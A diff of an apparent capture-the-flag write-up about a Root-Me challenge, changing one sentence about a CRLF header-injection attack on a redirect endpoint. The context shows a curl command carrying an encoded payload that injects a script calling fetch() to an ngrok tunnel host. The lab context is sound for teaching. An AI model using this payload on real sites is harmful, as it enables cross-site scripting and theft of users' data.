@@ -55,7 +55,7 @@ router.get('/api/redirect', (req, res) => {
 ````bash
 curl -G "http://dyn-01.xmas.root-me.org:24694/api/report" --data-urlencode "url=http://127.0.0.1:3000/api/redirect?url=%0D%0AContent-Type%3A%20text%2Fhtml%20%0A%0A%3Chtml%3E%3Cscript%3Efetch%28%27http%3A%2F%2F7.tcp.eu.ngrok.io%3A18440%2F%27%29%3C%2Fscript%3E%3C%2Fhtml%3E%0A%0A"
 ````
-Actually, \r\n chars triggered a 302 page meaning that page had been found on the server and well overwritten. At this point it was satisfying insofar as the payload applied to the target domain: 
+Actually, \r\n chars triggered a 302 page meaning that page had been found on the server and well overwritten. At this point it was satisfying insofar as the payload was ran on the target domain: 
 
 <p align="center"><img src="Screenshots/S4.png" alt="Desc"></p>
 
